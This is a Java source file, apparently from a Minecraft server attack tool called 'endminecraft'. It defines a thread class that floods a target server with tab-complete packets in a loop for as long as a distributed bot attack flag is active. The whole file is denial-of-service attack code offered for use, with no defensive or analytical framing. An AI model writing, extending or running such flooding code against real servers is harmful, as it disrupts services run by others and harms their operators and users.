package me.alikomi.endminecraft.tasks.tabAttack;

import me.alikomi.endminecraft.tasks.attack.DistributedBotAttack;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.packetlib.Client;

public class Tab17_8 extends Thread {

    private Client client;
    private String tabComplete;
    private int tabSleep;

    public Tab17_8(Client client, String tabComplete, int tabSleep) {
        this.client = client;
        this.tabComplete = tabComplete;
        this.tabSleep = tabSleep;
    }

    @Override
    public void run() {
        while (DistributedBotAttack.isAttack) {
            client.getSession().send(new ClientTabCompletePacket(tabComplete,false));
            try {
                Thread.sleep(tabSleep);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }
    }
}